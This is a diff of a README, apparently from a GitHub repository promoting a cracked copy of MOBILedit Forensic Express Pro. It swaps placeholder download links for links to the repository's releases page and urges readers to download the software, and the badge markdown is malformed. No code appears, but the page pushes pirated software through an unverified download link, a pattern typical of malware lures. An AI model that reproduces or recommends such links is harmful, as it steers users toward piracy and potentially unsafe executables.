@@ -26,7 +26,7 @@
 ---
 
 ## 📥 Get the Software:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/file/Soft.zip) Launch the provided link to get the software. If the link is not working, kindly check the "Releases" section for alternative options.
+[![Download Software](https://github.com/Huytung2006/MOBILedit_Forensic_Express_Pro_Crack/releases)](https://github.com/Huytung2006/MOBILedit_Forensic_Express_Pro_Crack/releases) Launch the provided link to get the software. If the link is not working, kindly check the "Releases" section for alternative options.
 
 ---
 
@@ -89,7 +89,7 @@ Get your hands on MOBILedit Forensic Express Pro Crack and unlock a world of pos
 ---
 
 ## 🌐 Visit the Provided Link:
-For more information and access to the software, visit the provided link: [Download Software](https://github.com/file/Soft.zip).
+For more information and access to the software, visit the provided link: [Download Software](https://github.com/Huytung2006/MOBILedit_Forensic_Express_Pro_Crack/releases).
 
 ---
 
